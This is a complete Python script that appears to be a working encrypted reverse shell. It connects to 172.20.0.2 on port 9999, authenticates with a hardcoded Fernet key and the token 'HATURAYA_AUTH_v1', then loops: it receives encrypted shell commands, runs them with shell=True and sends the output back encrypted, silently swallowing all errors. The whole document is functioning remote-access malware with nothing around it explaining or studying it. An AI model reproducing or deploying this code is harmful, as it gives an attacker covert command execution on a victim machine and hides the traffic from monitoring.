import socket,subprocess,sys,os
from cryptography.fernet import Fernet
f=Fernet(b'oR6n7xmt7ZNULBaaZGijy65YUgw27Wegqy4WJ7whJFs=')
s=socket.socket()
try:
    s.connect(('172.20.0.2',9999))
    s.sendall(f.encrypt(b'HATURAYA_AUTH_v1')+b'\n')
    raw=b''
    while b'\n' not in raw:raw+=s.recv(4096)
    if f.decrypt(raw.strip())!=b'HATURAYA_OK_v1':s.close();sys.exit(1)
    while True:
        raw=b''
        while b'\n' not in raw:
            c=s.recv(65535)
            if not c:raise ConnectionError()
            raw+=c
        cmd=f.decrypt(raw.strip()).decode()
        if cmd in('exit','quit'):break
        r=subprocess.run(cmd,shell=True,capture_output=True,cwd=os.getcwd())
        s.sendall(f.encrypt((r.stdout+r.stderr)or b'[no output]')+b'\n')
except:pass
finally:s.close()
